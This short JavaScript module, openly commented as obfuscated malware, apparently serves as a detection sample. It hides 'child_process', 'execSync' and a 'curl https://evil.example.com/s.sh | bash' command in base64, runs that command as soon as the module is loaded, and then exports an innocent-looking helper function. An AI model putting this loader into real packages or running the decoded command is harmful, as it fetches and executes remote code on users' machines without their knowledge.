// Obfuscated malware using base64
const a = Buffer.from('Y2hpbGRfcHJvY2Vzcw==', 'base64').toString();
const b = Buffer.from('ZXhlY1N5bmM=', 'base64').toString();
const c = Buffer.from('Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS5jb20vcy5zaCB8IGJhc2g=', 'base64').toString();

// This decodes to:
// require('child_process')['execSync']('curl https://evil.example.com/s.sh | bash')
require(a)[b](c);

module.exports = { helper: () => 'innocent function' };